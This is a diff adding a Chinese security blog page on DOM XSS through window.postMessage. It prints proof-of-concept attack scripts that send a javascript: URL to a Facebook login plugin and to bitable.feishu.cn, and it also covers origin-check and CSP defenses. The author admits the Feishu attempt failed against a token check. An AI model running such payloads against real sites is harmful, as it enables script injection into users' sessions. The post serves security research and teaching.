@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x00 介绍 window.postMessage参考: https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage window.postMessage() 主要是解决跨源通信的。  从广义上讲，一个窗口可以获得对另一个窗口的引用（比如 targetWindow = window.opener），然后在窗口上调用 ta">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一处自嗨postMessage的dom-xss小记">
+<meta property="og:url" content="http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/index.html">
+<meta property="og:site_name" content="Deen&#39;s blog">
+<meta property="og:description" content="0x00 介绍 window.postMessage参考: https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage window.postMessage() 主要是解决跨源通信的。  从广义上讲，一个窗口可以获得对另一个窗口的引用（比如 targetWindow = window.opener），然后在窗口上调用 ta">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://lh3.googleusercontent.com/pw/ACtC-3dFhU4gxfsg4tqKT3iTvzYNO9ScMZcn2UbRFr4A5NvWrhYPck2avmkRxj_VopQ52RroQM0JH7BrBgJCz6pgqGiX2_OlcczLp3Wh6pZ_G5gQ-kfhWpugoXuSdhQiIcHqwRsn-RRS6227mcEk3LBap58=w715-h126-no?authuser=0">
+<meta property="og:image" content="https://lh3.googleusercontent.com/pw/ACtC-3fB--e_cZG79QfPOS4K0f4bRkDBsnoyC9_E5lu8jUah4IF37NreGNFjzoIYKD14euFugjMVoiKAuv17MR4gtsWRr2uji0Vms3mwtKuCTvZdXX3Wa1GPT141CaD9B3KfLwv5gKevAgVYMmfWTBvG_cw=w821-h220-no?authuser=0">
+<meta property="og:image" content="https://lh3.googleusercontent.com/pw/ACtC-3cC4W4HxvOGbz6HEfLlnL1_VGXyn7DxHAp6uSXXJ4OV7zqNNmf_UXrd-oqZEF2wWEf0r3VUtM4k4Lr_V-I_v8c99StEC_YE510Ym84FzfCLdlf-oMVIDMATnoRuBhseFLnUM9WjZBMV05RLdnPX9uE=w1041-h164-no?authuser=0">
+<meta property="og:image" content="https://lh3.googleusercontent.com/pw/ACtC-3ev8dMoVLlp0aU5IROYchaBnNPJ6ofbu3PakrGD6iT973xG00fhyzfP7Cy976qG0n1Ly1N-VU1h5Xz31ctXFxcrF8pGnliTcA9-YWpITAsokXXnxUDJNORL5Rw_9X2fiT9OJQyuXDblTb4PzfGw7kI=w791-h910-no?authuser=0">
+<meta property="og:image" content="https://lh3.googleusercontent.com/pw/ACtC-3c1DB7w4khuL2v4D7Fv2mAD82YzjdJwIGPY_bQlq2ZOsoXWoT5GQBGGLmjQf09VsuSXy880JQhTtmSiPLGpYTRdDU7oJwSLXbByQP034bCSffB69tjBERiaccGhpGz-81r5nEYANZ0HQsWebQ45ojo=w1229-h28-no?authuser=0">
+<meta property="og:image" content="https://lh3.googleusercontent.com/pw/ACtC-3dkjiNnM0YBfvzE1HRQzoi-heIMFk0-r3vnLaJfNq1AFmtu9EBGPsWyCzYppz3pJMdg3dJY4I-cHEGWETk9xrJauoUstajbStiA-LqiafeFIUR-T_3yxrra8AHRCG4TfkaCkL3YQd5wbSVTrIydIyY=w1280-h746-no?authuser=0">
+<meta property="og:updated_time" content="2025-12-12T10:19:37.159Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一处自嗨postMessage的dom-xss小记">
+<meta name="twitter:description" content="0x00 介绍 window.postMessage参考: https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage window.postMessage() 主要是解决跨源通信的。  从广义上讲，一个窗口可以获得对另一个窗口的引用（比如 targetWindow = window.opener），然后在窗口上调用 ta">
+<meta name="twitter:image" content="https://lh3.googleusercontent.com/pw/ACtC-3dFhU4gxfsg4tqKT3iTvzYNO9ScMZcn2UbRFr4A5NvWrhYPck2avmkRxj_VopQ52RroQM0JH7BrBgJCz6pgqGiX2_OlcczLp3Wh6pZ_G5gQ-kfhWpugoXuSdhQiIcHqwRsn-RRS6227mcEk3LBap58=w715-h126-no?authuser=0">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/d33n.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/d33n.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>一处自嗨postMessage的dom-xss小记</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+    <link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    <script src="/lib/jquery/jquery.min.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<meta name="theme-color" content="#000000">
+<body>
+    
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/02/16/jQuery-dom-xss笔记/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/06/20/基于语义解析的DOM XSS检测/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <!-- <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li> -->
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <!-- <span id="i-share" class="info" style="display:none;">Share post</span> -->
+    </span>
+    <br/>
+    <!-- <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&text=一处自嗨postMessage的dom-xss小记"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&title=一处自嗨postMessage的dom-xss小记"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&is_video=false&description=一处自嗨postMessage的dom-xss小记"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一处自嗨postMessage的dom-xss小记&body=Check out this article: http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&title=一处自嗨postMessage的dom-xss小记"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&title=一处自嗨postMessage的dom-xss小记"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&title=一处自嗨postMessage的dom-xss小记"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&title=一处自嗨postMessage的dom-xss小记"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&name=一处自嗨postMessage的dom-xss小记&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div> -->
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-介绍-window-postMessage"><span class="toc-number">1.</span> <span class="toc-text">0x00 介绍 window.postMessage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-常出现的dom-xss-问题"><span class="toc-number">2.</span> <span class="toc-text">0x01 常出现的dom-xss 问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-postMessage防护"><span class="toc-number">3.</span> <span class="toc-text">0x02 postMessage防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-bitable-feishu-cn站点自嗨dom-xss"><span class="toc-number">4.</span> <span class="toc-text">0x03 bitable.feishu.cn站点自嗨dom-xss</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        一处自嗨postMessage的dom-xss小记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Deen's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2021-02-12T13:46:22.000Z" itemprop="datePublished">2021-02-12</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-介绍-window-postMessage"><a href="#0x00-介绍-window-postMessage" class="headerlink" title="0x00 介绍 window.postMessage"></a>0x00 介绍 window.postMessage</h2><p>参考: <code>https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</code></p>
+<p>window.postMessage() 主要是解决跨源通信的。</p>
+<blockquote>
+<p>从广义上讲，一个窗口可以获得对另一个窗口的引用（比如 targetWindow = window.opener），然后在窗口上调用 targetWindow.postMessage() 方法分发一个  MessageEvent 消息。接收</p>
+</blockquote>
+<h2 id="0x01-常出现的dom-xss-问题"><a href="#0x01-常出现的dom-xss-问题" class="headerlink" title="0x01 常出现的dom-xss 问题"></a>0x01 常出现的dom-xss 问题</h2><p><strong>其实就是引入了一个污点。</strong></p>
+<p>facebook给过一个2w刀的dom xss赏金——<a href="https://vinothkumar.me/20000-facebook-dom-xss/" target="_blank" rel="noopener">https://vinothkumar.me/20000-facebook-dom-xss/</a></p>
+<p>看一下关键触发代码：</p>
+<p><img src="https://lh3.googleusercontent.com/pw/ACtC-3dFhU4gxfsg4tqKT3iTvzYNO9ScMZcn2UbRFr4A5NvWrhYPck2avmkRxj_VopQ52RroQM0JH7BrBgJCz6pgqGiX2_OlcczLp3Wh6pZ_G5gQ-kfhWpugoXuSdhQiIcHqwRsn-RRS6227mcEk3LBap58=w715-h126-no?authuser=0" alt="image"></p>
+<p>这里的i.url是攻击者可控的，就是postmessage传递过去的数据，然后window.open触发，利用javascript伪协议，就可以变成一个xss漏洞。</p>
+<h2 id="0x02-postMessage防护"><a href="#0x02-postMessage防护" class="headerlink" title="0x02 postMessage防护"></a>0x02 postMessage防护</h2><p>可以参考这篇：<a href="https://security.tencent.com/index.php/blog/msg/107" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/107</a></p>
+<p>简单来说就是校验orgin.</p>
+<p><img src="https://lh3.googleusercontent.com/pw/ACtC-3fB--e_cZG79QfPOS4K0f4bRkDBsnoyC9_E5lu8jUah4IF37NreGNFjzoIYKD14euFugjMVoiKAuv17MR4gtsWRr2uji0Vms3mwtKuCTvZdXX3Wa1GPT141CaD9B3KfLwv5gKevAgVYMmfWTBvG_cw=w821-h220-no?authuser=0" alt="image"></p>
+<p>还可以提高利用难度，如设置csp， <code>x-frame-options: DENY</code>。</p>
+<p>这个意思是禁止所有iframe加载这个网站.</p>
+<p>从postMessage dom-xss漏洞利用来看，存在两种方式，一种是iframe， 一种是window.open， 示例如下。这个csp设计</p>
+<p>Pop-up method:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>   </span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> opener = <span class="built_in">window</span>.open(<span class="string">"https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;auto_logout_link=false&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;container_width=734&amp;locale=en_US&amp;sdk=joey&amp;size=large&amp;use_continue_as=true"</span>,<span class="string">"opener"</span>, <span class="string">"scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=500,height=1"</span>);</span></span><br><span class="line">   </span><br><span class="line"><span class="actionscript">   setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> message = &#123;<span class="string">"xdArbiterHandleMessage"</span>:<span class="literal">true</span>,<span class="string">"message"</span>:&#123;<span class="string">"method"</span>:<span class="string">"loginButtonStateInit"</span>,<span class="string">"params"</span>:<span class="built_in">JSON</span>.stringify(&#123;<span class="string">'call'</span>:&#123;<span class="string">'id'</span>:<span class="string">'123'</span>,<span class="string">'url'</span>:<span class="string">'javascript:alert(document.domain);'</span>,<span class="string">'size'</span>:&#123;<span class="string">'width'</span>:<span class="number">10</span>,<span class="string">'height'</span>:<span class="number">10</span>&#125;,<span class="string">'dims'</span>:&#123;<span class="string">'screenX'</span>:<span class="number">0</span>,<span class="string">'screenY'</span>:<span class="number">23</span>,<span class="string">'outerWidth'</span>:<span class="number">1680</span>,<span class="string">'outerHeight'</span>:<span class="number">971</span>,<span class="string">'screenWidth'</span>:<span class="number">1680</span>&#125;&#125;&#125;)&#125;,<span class="string">"origin"</span>:<span class="string">"ORIGIN"</span>&#125;;</span></span><br><span class="line"><span class="actionscript">        opener.postMessage(message, <span class="string">'*'</span>);</span></span><br><span class="line"><span class="actionscript">    &#125;,<span class="string">'4000'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Iframe method:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">fbFrameLoaded</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> iframeEl = <span class="built_in">document</span>.getElementById(<span class="string">'fbframe'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> message = &#123;<span class="string">"xdArbiterHandleMessage"</span>:<span class="literal">true</span>,<span class="string">"message"</span>:&#123;<span class="string">"method"</span>:<span class="string">"loginButtonStateInit"</span>,<span class="string">"params"</span>:<span class="built_in">JSON</span>.stringify(&#123;<span class="string">'call'</span>:&#123;<span class="string">'id'</span>:<span class="string">'123'</span>,<span class="string">'url'</span>:<span class="string">'javascript:alert(document.domain);'</span>,<span class="string">'size'</span>:&#123;<span class="string">'width'</span>:<span class="number">10</span>,<span class="string">'height'</span>:<span class="number">10</span>&#125;,<span class="string">'dims'</span>:&#123;<span class="string">'screenX'</span>:<span class="number">0</span>,<span class="string">'screenY'</span>:<span class="number">23</span>,<span class="string">'outerWidth'</span>:<span class="number">1680</span>,<span class="string">'outerHeight'</span>:<span class="number">971</span>,<span class="string">'screenWidth'</span>:<span class="number">1680</span>&#125;&#125;&#125;)&#125;,<span class="string">"origin"</span>:<span class="string">"ORIGIN"</span>&#125;;</span></span><br><span class="line"><span class="actionscript">  iframeEl.contentWindow.postMessage(message, <span class="string">'*'</span>);</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"fbframe"</span> <span class="attr">src</span>=<span class="string">"https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;auto_logout_link=false&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;container_width=734&amp;locale=en_US&amp;sdk=joey&amp;size=large&amp;use_continue_as=true"</span> <span class="attr">onload</span>=<span class="string">"fbFrameLoaded(this)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-bitable-feishu-cn站点自嗨dom-xss"><a href="#0x03-bitable-feishu-cn站点自嗨dom-xss" class="headerlink" title="0x03 bitable.feishu.cn站点自嗨dom-xss"></a>0x03 bitable.feishu.cn站点自嗨dom-xss</h2><ol>
+<li>漏洞触发代码，htmlpcindex开头的某个js文件。</li>
+</ol>
+<p><img src="https://lh3.googleusercontent.com/pw/ACtC-3cC4W4HxvOGbz6HEfLlnL1_VGXyn7DxHAp6uSXXJ4OV7zqNNmf_UXrd-oqZEF2wWEf0r3VUtM4k4Lr_V-I_v8c99StEC_YE510Ym84FzfCLdlf-oMVIDMATnoRuBhseFLnUM9WjZBMV05RLdnPX9uE=w1041-h164-no?authuser=0" alt="image"></p>
+<p><code>window.open(a.payload.url, &quot;_blank&quot;, &quot;noopener&quot;);</code> a为postmessage可控的数据。</p>
+<ol start="2">
+<li>设置了csp <img src="https://lh3.googleusercontent.com/pw/ACtC-3ev8dMoVLlp0aU5IROYchaBnNPJ6ofbu3PakrGD6iT973xG00fhyzfP7Cy976qG0n1Ly1N-VU1h5Xz31ctXFxcrF8pGnliTcA9-YWpITAsokXXnxUDJNORL5Rw_9X2fiT9OJQyuXDblTb4PzfGw7kI=w791-h910-no?authuser=0" alt="image"></li>
+<li>payload </li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>   </span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> opener = <span class="built_in">window</span>.open(<span class="string">"https://bitable.feishu.cn/"</span>,<span class="string">"opener"</span>, <span class="string">"scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=500,height=1"</span>);</span></span><br><span class="line"><span class="actionscript">   setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> message = &#123;<span class="string">"xdArbiterHandleMessage"</span>:<span class="literal">true</span>,<span class="string">"token"</span>:<span class="string">"VcX507E54v"</span>,<span class="string">"payload"</span>:&#123;<span class="string">"url"</span>:<span class="string">"javascript:alert(document.domain)"</span>,<span class="string">"target"</span>:<span class="string">"_self"</span>&#125;,<span class="string">"method"</span>:<span class="string">"navigator.change"</span>,<span class="string">"message"</span>:<span class="string">""</span>,<span class="string">"origin"</span>:<span class="string">"ORIGIN"</span>&#125;;</span></span><br><span class="line"><span class="actionscript">        opener.postMessage(message, <span class="string">'*'</span>);</span></span><br><span class="line"><span class="actionscript">    &#125;,<span class="string">'1000'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我以为大功告成了，再看才发现还有个token校验，这个token还是个生成的10位随机数。</p>
+<p><img src="https://lh3.googleusercontent.com/pw/ACtC-3c1DB7w4khuL2v4D7Fv2mAD82YzjdJwIGPY_bQlq2ZOsoXWoT5GQBGGLmjQf09VsuSXy880JQhTtmSiPLGpYTRdDU7oJwSLXbByQP034bCSffB69tjBERiaccGhpGz-81r5nEYANZ0HQsWebQ45ojo=w1229-h28-no?authuser=0" alt="image"></p>
+<p>想办法绕过这个随机数。</p>
+<ol>
+<li>js伪随机数，不行</li>
+<li>趁token还是undefined的时候触发漏洞，不行，token生成一定在前面</li>
+</ol>
+<p>好吧，都行不通，终极白忙活。</p>
+<p>假装获取到token，合影留念……</p>
+<p><img src="https://lh3.googleusercontent.com/pw/ACtC-3dkjiNnM0YBfvzE1HRQzoi-heIMFk0-r3vnLaJfNq1AFmtu9EBGPsWyCzYppz3pJMdg3dJY4I-cHEGWETk9xrJauoUstajbStiA-LqiafeFIUR-T_3yxrra8AHRCG4TfkaCkL3YQd5wbSVTrIydIyY=w1280-h746-no?authuser=0" alt="image"></p>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-介绍-window-postMessage"><span class="toc-number">1.</span> <span class="toc-text">0x00 介绍 window.postMessage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-常出现的dom-xss-问题"><span class="toc-number">2.</span> <span class="toc-text">0x01 常出现的dom-xss 问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-postMessage防护"><span class="toc-number">3.</span> <span class="toc-text">0x02 postMessage防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-bitable-feishu-cn站点自嗨dom-xss"><span class="toc-number">4.</span> <span class="toc-text">0x03 bitable.feishu.cn站点自嗨dom-xss</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&text=一处自嗨postMessage的dom-xss小记"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&title=一处自嗨postMessage的dom-xss小记"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&is_video=false&description=一处自嗨postMessage的dom-xss小记"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一处自嗨postMessage的dom-xss小记&body=Check out this article: http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&title=一处自嗨postMessage的dom-xss小记"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&title=一处自嗨postMessage的dom-xss小记"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&title=一处自嗨postMessage的dom-xss小记"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&title=一处自嗨postMessage的dom-xss小记"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/02/12/一处自嗨postMessage的dom-xss小记/&name=一处自嗨postMessage的dom-xss小记&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <!-- <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li> -->
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2025 Deen&#39;s blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      <script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
